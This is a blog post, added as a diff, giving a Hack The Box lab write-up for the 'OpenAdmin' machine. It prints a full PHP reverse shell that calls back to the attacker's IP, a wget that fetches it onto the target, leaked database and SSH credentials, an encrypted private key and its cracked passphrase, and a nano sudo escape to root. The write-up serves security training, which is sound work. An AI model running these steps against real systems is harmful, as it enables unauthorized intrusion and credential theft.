@@ -1,0 +1,535 @@
+---
+layout: htb_box
+title: "HTB: OpenAdmin"
+code: htb_openadmin
+long_date: "19th February 2020"
+author: rubytox
+---
+
+<p>Hello everyone!</p>
+
+<p>Today, I'm publishing a writeup for the machine <a href="https://www.hackthebox.eu/home/machines/profile/222">OpenAdmin</a>, created by
+    <a href="https://www.hackthebox.eu/home/users/profile/82600">dmw0ng</a>. This machine was rated easy, and I think it was a pretty
+    accurate rate.<!--more--></p>
+
+<p>So, let's get started! As usual, I add the box's IP address to <code>/etc/hosts</code> so it will be referenced
+    to as <code>openadmin.htb</code>.</p>
+
+<p>We begin by a classic <code>nmap</code> scan, which gives the following result:</p>
+<pre class="prettyprint nocode">
+$ nmap -sC -sV -oA nmap/openAdmin openAdmin.htb
+# Nmap 7.60 scan initiated Fri Jan 10 22:54:04 2020 as: nmap -sC -sV -oA nmap/openAdmin openAdmin.htb
+Nmap scan report for openAdmin.htb (10.10.10.171)
+Host is up (0.58s latency).
+rDNS record for 10.10.10.171: openadmin.htb
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (EdDSA)
+80/tcp open  http?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jan 10 22:57:21 2020 -- 1 IP address (1 host up) scanned in 197.28 seconds
+</pre>
+
+<p>So the machine appears to host a website on port 80; when we take a look at it, it's just Apache default homepage.
+    At this point, I tried to enumerate directories using <code>dirb</code> and <code>gobuster</code>, but it didn't lead
+    me anywhere. This part actually needed a bit more researches: after a while, I figured out that the name OpenAdmin
+    was a reference to <a href="http://opennetadmin.com">OpenNetAdmin</a>.</p>
+
+<p>OpenNetAdmin<sup><a href="#fn1" id="ref1">1</a></sup> is a platform providing tools to manage an IP network. Reading
+    its user manual, I learned that its default access path was under the directory <code>ona</code>, so I went to
+    the following URL: <code>http://openadmin.htb/ona/</code>. I came across sort of a dashboard which looked like that:</p>
+
+<img src="/img/{{ page.code }}/openadmin1.png" alt="OpenNetAdmin dashboard" />
+
+<p>Interesting fact, we're actually logged in as a guest user, as shown at the top right of the dashboard. A warning
+    message on the page says that the OpenNetAdmin's hosted version is outdated: we're using version 18.1.1. Let's see
+    whether there's any exploit for this version.</p>
+
+<p>It's easy to find that there is one: exploit number <a href="https://www.exploit-db.com/exploits/47691">47691</a>
+    on <a href="https://www.exploit-db.com">exploit-db</a>. This exploit actually allows us to run commands directly
+    on the distant server. I downloaded the exploit and tried to use it the following way:</p>
+<pre class="prettyprint nocode">
+$ ./exploit.sh openadmin.htb
+</pre>
+
+<p>Obviously, it didn't work because I had to provide it with OpenNetAdmin host folder, so the following way
+    worked better:</p>
+<pre class="prettyprint nocode">
+$ ./exploit.sh openadmin.htb/ona/
+</pre>
+
+<p><strong>Note:</strong> the slash at the end of the URL is actually mandatory, the exploit won't work if you don't
+    write it.</p>
+
+<p>The exploit prompts a dollar $ when used, but it is not a shell: it is just a user-friendly way to write commands.
+    In fact, we can't even navigate through directories:</p>
+<pre class="prettyprint nocode">
+$ ./exploit.sh openadmin.htb/ona/
+$ pwd
+/opt/ona/www
+$ cd ..
+$ pwd
+/opt/ona/www
+</pre>
+
+<p>Here, the right thing to do is find a way to get a real remote shell. We could use programs such as <code>nc</code> or
+    <code>ncat</code>, but it is not very efficient. For this box, I tried using another way: I got a PHP code which allowed
+    me to get a reverse shell through <code>nc</code>. The PHP code is:</p>
+<pre class="prettyprint linenums">
+&lt;?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  The author accepts no liability
+// for damage caused by this tool.  If these terms are not acceptable to you, then
+// do not use this tool.
+//
+// In all other respects the GPL version 2 applies:
+//
+// This program is free software; you can redistribute it and/or modify
+// it under the terms of the GNU General Public License version 2 as
+// published by the Free Software Foundation.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License along
+// with this program; if not, write to the Free Software Foundation, Inc.,
+// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  If these terms are not acceptable to
+// you, then do not use this tool.
+//
+// You are encouraged to send comments, improvements or suggestions to
+// me at pentestmonkey@pentestmonkey.net
+//
+// Description
+// -----------
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+// The recipient will be given a shell running as the current user (apache normally).
+//
+// Limitations
+// -----------
+// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
+// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
+//
+// Usage
+// -----
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.16.60';  // CHANGE THIS
+$port = 1338;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/bash -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+        // Fork and have the parent process exit
+        $pid = pcntl_fork();
+
+        if ($pid == -1) {
+                printit("ERROR: Can't fork");
+                exit(1);
+        }
+
+        if ($pid) {
+                exit(0);  // Parent exits
+        }
+
+        // Make the current process a session leader
+        // Will only succeed if we forked
+        if (posix_setsid() == -1) {
+                printit("Error: Can't setsid()");
+                exit(1);
+        }
+
+        $daemon = 1;
+} else {
+        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+        printit("$errstr ($errno)");
+        exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+        printit("ERROR: Can't spawn shell");
+        exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+        // Check for end of TCP connection
+        if (feof($sock)) {
+                printit("ERROR: Shell connection terminated");
+                break;
+        }
+
+        // Check for end of STDOUT
+        if (feof($pipes[1])) {
+                printit("ERROR: Shell process terminated");
+                break;
+        }
+
+        // Wait until a command is end down $sock, or some
+        // command output is available on STDOUT or STDERR
+        $read_a = array($sock, $pipes[1], $pipes[2]);
+        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+        // If we can read from the TCP socket, send
+        // data to process's STDIN
+        if (in_array($sock, $read_a)) {
+                if ($debug) printit("SOCK READ");
+                $input = fread($sock, $chunk_size);
+                if ($debug) printit("SOCK: $input");
+                fwrite($pipes[0], $input);
+        }
+
+        // If we can read from the process's STDOUT
+        // send data down tcp connection
+        if (in_array($pipes[1], $read_a)) {
+                if ($debug) printit("STDOUT READ");
+                $input = fread($pipes[1], $chunk_size);
+                if ($debug) printit("STDOUT: $input");
+                fwrite($sock, $input);
+        }
+
+        // If we can read from the process's STDERR
+        // send data down tcp connection
+        if (in_array($pipes[2], $read_a)) {
+                if ($debug) printit("STDERR READ");
+                $input = fread($pipes[2], $chunk_size);
+                if ($debug) printit("STDERR: $input");
+                fwrite($sock, $input);
+        }
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+        if (!$daemon) {
+                print "$string\n";
+        }
+}
+
+?&gt;
+</pre>
+
+<p>This script is kinda easy to understand, it is really well commented. How to upload this script to the remote
+    server? There are several ways to do so. I used the Python module <code>SimpleHTTPServer</code> which allows me to
+    host a really basic HTTP Server. I launch it in my working directory the following way:</p>
+<pre class="prettyprint nocode">
+$ python2.7 -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</pre>
+
+<p><strong>Note:</strong> For Python 3, the module is now called <code>http.server</code>.</p>
+
+<p>Now that we have our server, we can use the exploit to download the PHP page. Assuming the PHP script is called
+    <code>reverse_shell.php</code>, we run the following commands:</p>
+<pre class="prettyprint nocode">
+$ ./exploit.sh openadmin.htb/ona/
+$ wget http://10.10.16.60:8000/reverse_shell.php
+</pre>
+
+<p>Now, our reverse shell script should have been uploaded to the OpenNetAdmin server. To use it, simply open a <code>nc</code>
+    listener on port 1338, and in a web browser, access the reverse shell page:</p>
+<pre class="prettyprint nocode">
+$ nc -vlp 1338
+Listening on [0.0.0.0] (family 0, port 1338)
+Connection from openadmin.htb 56922 received!
+Linux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 17:43:53 up 49 min,  9 users,  load average: 1.40, 1.48, 1.52
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+joanna   pts/0    10.10.14.69      16:54   43:36   0.06s  0.00s sshd: joanna [priv]
+jimmy    pts/1    10.10.14.244     17:21   22:38   0.04s  0.04s -bash
+jimmy    pts/2    10.10.16.31      16:55    9:17   0.49s  0.49s -bash
+joanna   pts/3    10.10.15.164     17:00    1:20   0.13s  0.02s nano search_history
+jimmy    pts/5    10.10.14.132     16:58    4:39   0.14s  0.14s -bash
+jimmy    pts/7    10.10.15.164     17:00   41.00s  0.07s  0.07s -bash
+jimmy    pts/8    10.10.14.237     17:37    1.00s  0.28s  0.28s -bash
+joanna   pts/9    10.10.14.112     17:11    7.00s  0.11s  0.02s bash
+joanna   pts/12   10.10.15.211     17:18   18:41   0.03s  0.03s -bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+bash: cannot set terminal process group (1009): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@openadmin:/$
+</pre>
+
+<p>So now we see that we obtained a low-privileged shell for user <code>www-data</code>. Let's find out which user
+    we will have to own:</p>
+<pre class="prettyprint nocode">
+$ ls -l /home
+drwxr-x--- 6 jimmy  jimmy  4096 Feb 19 17:12 jimmy
+drwxr-x--- 6 joanna joanna 4096 Nov 28 09:37 joanna
+</pre>
+
+<p>There are two users, <code>jimmy</code> and <code>joanna</code>. We can't access their home directories for now, so
+    let's enumerate! First, the only service we currently know about is OpenNetAdmin. This service might me managed
+    by one of our two users, so that could be a great idea to go and check on OpenNetAdmin's config files. After
+    a little bit of enumeration, we actually come across a file containing database settings, under the directory
+    <code>/opt/ona/www/local/config</code>. This file contains the following information:</p>
+<pre class="prettyprint linenums">
+&lt;?php
+
+$ona_contexts=array (
+  'DEFAULT' =&gt;
+    array (
+    'databases' =&gt;
+    array (
+      0 =&gt;
+      array (
+        'db_type' =&gt; 'mysqli',
+        'db_host' =&gt; 'localhost',
+        'db_login' =&gt; 'ona_sys',
+        'db_passwd' =&gt; 'n1nj4W4rri0R!',
+        'db_database' =&gt; 'ona_default',
+        'db_debug' =&gt; false,
+      ),
+    ),
+    'description' =&gt; 'Default data context',
+    'context_color' =&gt; '#D3DBFF',
+  ),
+);
+
+?&gt;
+</pre>
+
+<p>So there is a MySQL database, and there is a user <code>ona_sys</code> whose password is <code>n1nj4W4rri0R!</code>. It
+    is actually worth trying whether this password is Jimmy's or Joanna's account password.</p>
+
+<p>Actually, it was Jimmy's password, as we were able to log to his account over SSH with this password. However, there is
+    not <code>user.txt</code> file in there, so I guess we will find it under Joanna's home directory. As Jimmy's home
+    directory is empty, we must enumerate more in order to gain access Joanna's account.</p>
+
+<p>If we look under the directory <code>/var/www</code>, we will find the following directories:</p>
+<pre class="prettyprint nocode">
+$ ls -l
+drwxr-xr-x 6 www-data www-data 4096 Nov 22 15:59 html
+drwxrwx--- 2 jimmy    internal 4096 Nov 23 17:43 internal
+lrwxrwxrwx 1 www-data www-data   12 Nov 21 16:07 ona -> /opt/ona/www
+</pre>
+
+<p>We found a directory owned by Jimmy and only accessible by him and the members of the group <code>internal</code>. Note that
+    I actually found this directory during the first enumeration phase, however it wasn't accessible from <code>www-data</code>.</p>
+
+<p><strong>Note:</strong>The directory <code>internal</code> is located in <code>/var/www</code>, so we might think it's
+    accessible from our browser. However, it's not because if we look at its configuration file in Apache2 directory, we see the
+    following settings (file <code>/etc/apache2/sites-available/internal.conf</code>):</p>
+<pre class="prettyprint nocode linenums">
+Listen 127.0.0.1:52846
+
+&lt;VirtualHost 127.0.0.1:52846&gt;
+    ServerName internal.openadmin.htb
+    DocumentRoot /var/www/internal
+
+&lt;IfModule mpm_itk_module&gt;
+AssignUserID joanna joanna
+&lt;/IfModule&gt;
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+&lt;/VirtualHost&gt;
+</pre>
+
+<p>Apache is listening on <code>127.0.0.1</code>, so there's no way we would have been able to access this directory.</p>
+
+<p>Back to <code>internal</code>, we have found three files:</p>
+<pre class="prettyprint nocode">
+$ ls -l
+-rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php
+-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
+-rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php
+</pre>
+
+<p>We find that <code>index.php</code> is actually a login form. When looking at the PHP code, we find the following lines:</p>
+<pre class="prettyprint linenums">
+&lt;?php
+    $msg = '';
+
+    if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
+      if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
+          $_SESSION['username'] = 'jimmy';
+          header("Location: /main.php");
+      } else {
+          $msg = 'Wrong username or password.';
+      }
+    }
+?&gt;
+</pre>
+
+<p>So for the form to work, we need to authenticate as Jimmy, and we have a password hash. This hash can be cracked using
+    John The Ripper, or easier using <a href="http://crackstation.net">crackstation.net</a>: the password is <strong>Revealed</strong>.</p>
+
+<p>Then, we notice that if we provide the correct password, we are redirected to the file <code>main.php</code>, which
+    contains the following code:</p>
+<pre class="prettyprint linenums">
+&lt;?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
+# Open Admin Trusted
+# OpenAdmin
+$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
+echo "&lt;pre&gt;$output&lt;/pre&gt;";
+?&gt;
+&lt;html&gt;
+&lt;h3&gt;Don't forget your "ninja" password&lt;/h3&gt;
+Click here to logout &lt;a href="logout.php" tite = "Logout"&gt;Session
+&lt;/html&gt;
+</pre>
+
+<p>This code shows that if we have successfully logged in using Jimmy's credentials, then the script will output the content
+    of Joanna's private key! Actually, we don't even need to find Jimmy's password, because the following command is enough:</p>
+<pre class="prettyprint nocode">
+$ curl -XPOST 127.0.0.1:52846/main.php
+&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+&lt;/pre&gt;&lt;html&gt;
+&lt;h3&gt;Don't forget your "ninja" password&lt;/h3&gt;
+Click here to logout &lt;a href="logout.php" tite = "Logout"&gt;Session
+&lt;/html&gt;
+</pre>
+
+<p>So, here we have Joanna's private RSA key, encoded by the algorithm AES-128-CBC. We can crack it using the utility
+    <code>ssh2john</code>. This programm is going to extract the passphrase's hash from the file:</p>
+<pre class="prettyprint nocode">
+$ ssh2john id_rsa > joanna.hash
+</pre>
+
+<p>Then, we use <code>john</code> and the wordlist <code>rockyou</code> to crack the passphrase:</p>
+<pre class="prettyprint nocode">
+$ john joanna.hash --wordlist=rockyou.txt
+id_rsa:bloodninjas
+</pre>
+
+<p>So now we have the passphrase for Joanna's private key, and we can log in to her account over SSH:</p>
+<pre class="prettyprint nocode">
+$ ssh -i id_rsa joanna@openadmin.htb
+Enter passphrase for key 'id_rsa': <span style="color: #6D071A; font-weight: bold;">bloodninjas</span>
+joanna@openadmin:~$ cat user.txt
+c9b2c[-- REDACTED --]81b5f
+</pre>
+
+<p>Now, let's own root! Root is actually very straightforward. One of the first things that needs to be checked is whether
+    the current user is allowed to execute some programs using <code>sudo</code>. We check that using the <code>-l</code>
+    option, which here gives us the following result:</p>
+<pre class="prettyprint nocode">
+$ sudo -l
+Matching Defaults entries for joanna on openadmin:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+</pre>
+
+<p>The last line actually means that user <code>joanna</code> is allowed to use the command <code>sudo /bin/nano /opt/priv</code>
+    without being prompted for a password. We see that the allowed command is calling <code>nano</code>: we can go and check
+    GTFObins' <a href="https://gtfobins.github.io/gtfobins/nano/">nano page</a>, in order to see that there is a very simple
+    way to run a command from within the editor. When using <code>nano</code>, simply typing the following commands works:</p>
+<pre class="prettyprint nocode">
+^R^X
+reset; sh 1>&0 2>&0
+</pre>
+
+<p>This command just launches <code>sh</code> and redirects <code>stdout</code> and <code>stdin</code> accordingly. We then
+    have:</p>
+<pre class="prettyprint nocode">
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+2f907[-- REDACTED --]5b561
+</pre>
+
+<p>And we owned root! I found that this box was pretty fun: it was rated easy and I agree with that, there are plenty of
+    boxed rated easy that are actually a lot harder than this. I think I learned a lot about enumeration in this challenge.</p>
+
+<p>So this is over for this box! If you have any comments or suggestions, feel free to open an issue on <a href="https://github.com/Rubytox/Rubytox.github.io">this website's GitHub page</a>.</p>
+
+<!-- Footnotes -->
+
+<hr />
+
+<sup id="fn1">1. <a href="http://opennetadmin.com">http://opennetadmin.com</a><a href="#ref1" title="Jump back to footnote 1 in the text.">↩</a></sup>
